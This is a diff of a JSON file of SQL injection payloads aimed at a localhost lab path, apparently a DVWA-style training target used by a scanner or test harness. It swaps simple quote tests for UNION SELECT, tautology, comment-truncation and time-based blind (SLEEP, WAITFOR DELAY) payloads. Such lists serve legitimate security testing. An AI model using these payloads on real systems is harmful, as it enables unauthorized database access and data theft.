@@ -2,11 +2,6 @@
     {
         "type": "SQL Injection",
         "url": "http://localhost:8080/vulnerabilities/sqli/",
-        "payload": "'"
-    },
-    {
-        "type": "SQL Injection",
-        "url": "http://localhost:8080/vulnerabilities/sqli/",
         "payload": "' OR '1'='1"
     },
     {
@@ -17,16 +12,41 @@
     {
         "type": "SQL Injection",
         "url": "http://localhost:8080/vulnerabilities/sqli/",
-        "payload": "' OR 'a'='a"
+        "payload": "' UNION SELECT NULL--"
     },
     {
         "type": "SQL Injection",
         "url": "http://localhost:8080/vulnerabilities/sqli/",
-        "payload": "' OR 1=1#"
+        "payload": "' AND SLEEP(5)--"
+    },
+    {
+        "type": "SQL Injection",
+        "url": "http://localhost:8080/vulnerabilities/sqli/",
+        "payload": "1' OR '1'='1"
+    },
+    {
+        "type": "SQL Injection",
+        "url": "http://localhost:8080/vulnerabilities/sqli/",
+        "payload": "' OR ''='"
     },
     {
         "type": "SQL Injection",
         "url": "http://localhost:8080/vulnerabilities/sqli/",
         "payload": "admin'--"
+    },
+    {
+        "type": "SQL Injection",
+        "url": "http://localhost:8080/vulnerabilities/sqli/",
+        "payload": "' UNION SELECT 1,2,3--"
+    },
+    {
+        "type": "SQL Injection",
+        "url": "http://localhost:8080/vulnerabilities/sqli/",
+        "payload": "'; WAITFOR DELAY '0:0:5'--"
+    },
+    {
+        "type": "SQL Injection",
+        "url": "http://localhost:8080/vulnerabilities/sqli/",
+        "payload": "' AND 1=0--"
     }
 ]
